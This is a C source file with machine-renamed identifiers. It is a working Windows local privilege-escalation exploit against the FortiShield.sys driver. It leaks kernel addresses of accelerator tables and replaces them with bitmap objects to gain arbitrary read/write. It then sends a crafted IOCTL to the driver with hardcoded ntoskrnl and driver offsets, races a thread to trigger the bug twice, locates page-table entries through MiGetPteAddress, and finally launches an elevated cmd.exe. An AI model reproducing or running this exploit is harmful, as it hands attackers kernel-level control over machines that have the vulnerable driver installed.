
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


struct bitmap_structure {int worker_bitmap; int manager_bitmap; } ;
typedef int ULONGLONG ;
struct TYPE_3__ {scalar_t__ pHeader; } ;
typedef TYPE_1__* PHANDLEENTRY ;
typedef scalar_t__ LPVOID ;
typedef int LPTHREAD_START_ROUTINE ;
typedef int LPDWORD ;
typedef int LPCSTR ;
typedef scalar_t__ HANDLE ;
typedef scalar_t__ HACCEL ;
typedef int DWORD ;
typedef scalar_t__ BOOL ;


 int VAR_0 ;
 scalar_t__ FUNC_0 (int ,int,int ,int *,int ,int ,int *) ;
 scalar_t__ FUNC_1 (int *,int ,int ,int *,int ,int ) ;
 int FUNC_2 (int ) ;
 scalar_t__ FUNC_3 (scalar_t__,int,scalar_t__,int,scalar_t__,int,int*,int *) ;
 int VAR_1 ;
 int VAR_2 ;
 scalar_t__ FUNC_4 (char*) ;
 int FUNC_5 () ;
 int VAR_3 ;
 scalar_t__ VAR_4 ;
 void* FUNC_6 (int ) ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_7 (scalar_t__) ;
 scalar_t__ FUNC_8 (scalar_t__,int ) ;
 int VAR_7 ;
 scalar_t__ FUNC_9 (scalar_t__,int,int ) ;
 int FUNC_10 (scalar_t__,int ) ;
 scalar_t__ FUNC_11 (scalar_t__,int,int,int,int) ;
 scalar_t__ FUNC_12 (scalar_t__,int,int,int) ;
 int FUNC_13 (scalar_t__*,int) ;
 struct bitmap_structure FUNC_14 (scalar_t__*) ;
 int FUNC_15 (int,int) ;
 int FUNC_16 () ;
 int FUNC_17 (int *,scalar_t__*,TYPE_1__**) ;
 int * VAR_8 ;
 int VAR_9 ;
 int FUNC_18 (char*,...) ;
 int FUNC_19 (int ) ;
 int FUNC_20 (char*) ;
 int VAR_10 ;
 int * VAR_11 ;
 int FUNC_21 (int ,int) ;

int FUNC_22() {
 VAR_8 = FUNC_6((LPCSTR)"ntdll");
 if (VAR_8 == ((void*)0)) {
  FUNC_18("[!] Error while loading ntdll: %d\n", FUNC_5());
  return 1;
 }

 VAR_11 = FUNC_6((LPCSTR)"user32");
 if (VAR_11 == ((void*)0)) {
  FUNC_18("[!] Error while loading user32: %d.\n", FUNC_5());
  return 1;
 }

 HACCEL VAR_12[VAR_9];
 FUNC_13(VAR_12, VAR_9);

 PHANDLEENTRY VAR_13[VAR_9];
 FUNC_17(VAR_11, VAR_12, VAR_13);

 FUNC_18(
  "[+] Accelerator Table[0] HANDLE: %I64x\n"
  "[+] Accelerator Table[0] HANDLE: %I64x\n"
  "[+] Accelerator Table[0] kernel address: %I64x\n"
  "[+] Accelerator Table[0] kernel address: %I64x\n",
  (ULONGLONG)VAR_12[0],
  (ULONGLONG)VAR_12[1],
  (ULONGLONG)VAR_13[0]->pHeader,
  (ULONGLONG)VAR_13[1]->pHeader
 );

 ULONGLONG VAR_14;
 ULONGLONG VAR_15;
 VAR_14 = (ULONGLONG)VAR_13[0]->pHeader + 0x18 + 0x38;
 VAR_15 = (ULONGLONG)VAR_13[1]->pHeader + 0x18 + 0x38;

 FUNC_18("[+] Replacing Accelerator Tables with BitMap objects\n");
 struct bitmap_structure VAR_16;
 VAR_16 = FUNC_14(VAR_12);

 FUNC_18("[+] Manager BitMap pvScan0 offset: %I64x\n", (ULONGLONG)VAR_14);
 FUNC_18("[+] Worker BitMap pvScan0 offset: %I64x\n", (ULONGLONG)VAR_15);

 HANDLE VAR_17;
 VAR_17 = FUNC_0((LPCSTR)"\\\\.\\FortiShield", VAR_1 | VAR_2, 0, ((void*)0), VAR_6, 0, ((void*)0));
 if (VAR_17 == VAR_4) {
  FUNC_18("[!] Error while creating a handle to the driver: %d\n", FUNC_5());
  return 1;
 }

 LPVOID VAR_18 = FUNC_4("ntoskrnl.exe");
 LPVOID VAR_19 = FUNC_4("FortiShield.sys");
 ULONGLONG VAR_20 = (ULONGLONG)VAR_18 + 0x4efae5;
 ULONGLONG VAR_21 = (ULONGLONG)VAR_19 + 0xd150;
 ULONGLONG VAR_22 = (ULONGLONG)VAR_19 + 0x2f73;
 FUNC_18("[+] Kernel found at: %llx\n", (ULONGLONG)VAR_18);
 FUNC_18("[+] FortiShield.sys found at: %llx\n", (ULONGLONG)VAR_19);

 DWORD VAR_23 = 0x220028;
 ULONGLONG VAR_24 = VAR_20;
 DWORD VAR_25 = 0x8;
 ULONGLONG VAR_26 = 0x0;
 DWORD VAR_27 = 0x0;
 DWORD VAR_28;

 LPVOID VAR_29;
 VAR_29 = FUNC_11(VAR_18, VAR_21, VAR_22, VAR_14, VAR_15);

 HANDLE VAR_30;
 LPDWORD VAR_31 = 0;
 VAR_30 = FUNC_1(((void*)0), 0, (LPTHREAD_START_ROUTINE)&VAR_10, ((void*)0), VAR_0, VAR_31);
 if (VAR_30 == ((void*)0))
 {
  FUNC_18("[!] Error while calling CreateThread: %d\n", FUNC_5());
  return 1;
 }

 BOOL VAR_32;
 VAR_32 = FUNC_8(VAR_30, VAR_7);
 if (VAR_32 == 0)
 {
  FUNC_18("[!] Error while calling SetThreadPriority: %d\n", FUNC_5());
  return 1;
 }


 FUNC_18("[+] Press ENTER to trigger the vulnerability.\n");
 FUNC_16();


 BOOL VAR_33;
 FUNC_7(VAR_30);
 VAR_33 = FUNC_3(VAR_17, VAR_23, (LPVOID)&VAR_24, VAR_25, (LPVOID)&VAR_26, VAR_27, &VAR_28, ((void*)0));
 FUNC_10(VAR_30, VAR_3);


 ULONGLONG VAR_34 = (ULONGLONG)VAR_18 + 0x47314 + 0x13;

 FUNC_18("[+] Writing nt!MiGetPteAddress + 0x13 to Worker pvScan0.\n");
 FUNC_16();
 FUNC_21(VAR_16.manager_bitmap, VAR_34);

 FUNC_18("[+] Reading from Worker pvScan0.\n");
 FUNC_16();
 ULONGLONG VAR_35 = FUNC_19(VAR_16.worker_bitmap);
 FUNC_18("[+] PTE virtual base address: %I64x\n", VAR_35);

 ULONGLONG VAR_36;
 ULONGLONG VAR_37 = 0x8b000000;
 VAR_36 = FUNC_15(VAR_37, VAR_35);
 FUNC_18("[+] PTE virtual address for 0x8b000000: %I64x\n", VAR_36);


 BOOL VAR_38;
 VAR_38 = FUNC_9(VAR_29, 0x0, VAR_5);
 if (VAR_38 == 0)
 {
  FUNC_18("[!] Error while calling VirtualFree: %d\n", FUNC_5());
  return 1;
 }

 LPVOID VAR_39;
 VAR_39 = FUNC_12(VAR_18, VAR_21, VAR_22, VAR_36);

 VAR_30 = FUNC_1(((void*)0), 0, (LPTHREAD_START_ROUTINE)&VAR_10, ((void*)0), VAR_0, VAR_31);
 if (VAR_30 == ((void*)0))
 {
  FUNC_18("[!] Error while calling CreateThread: %d\n", FUNC_5());
  return 1;
 }

 VAR_32 = FUNC_8(VAR_30, VAR_7);
 if (VAR_32 == 0)
 {
  FUNC_18("[!] Error while calling SetThreadPriority: %d\n", FUNC_5());
  return 1;
 }

 FUNC_18("[+] Press ENTER to trigger the vulnerability again.\n");
 FUNC_16();

 FUNC_7(VAR_30);
 VAR_33 = FUNC_3(VAR_17, VAR_23, (LPVOID)&VAR_24, VAR_25, (LPVOID)&VAR_26, VAR_27, &VAR_28, ((void*)0));
 FUNC_10(VAR_30, VAR_3);

 FUNC_18("\n");
 FUNC_20("start cmd.exe");
 FUNC_2(VAR_16.manager_bitmap);
 FUNC_2(VAR_16.worker_bitmap);

 return 0;
}
